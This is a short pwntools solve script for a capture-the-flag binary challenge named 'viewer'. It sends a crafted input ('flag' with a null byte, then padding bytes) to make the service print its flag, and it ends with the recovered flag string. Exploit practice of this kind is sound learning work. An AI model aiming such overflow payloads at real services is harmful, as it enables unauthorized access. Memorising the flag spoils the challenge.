#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 1337
HOST = "viewer.challs.pwnoh.io"
exe = context.binary = ELF('./viewer', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            brva 0x0000000000001457
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT, ssl=True)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
payload = b'flag\0' + b'a'*0x10
print(payload)
# GDB()
p.sendlineafter(b'> ', payload)

p.interactive()

# bctf{I_C4nt_Enum3rAte_7hE_vuLn3r4biliTI3s}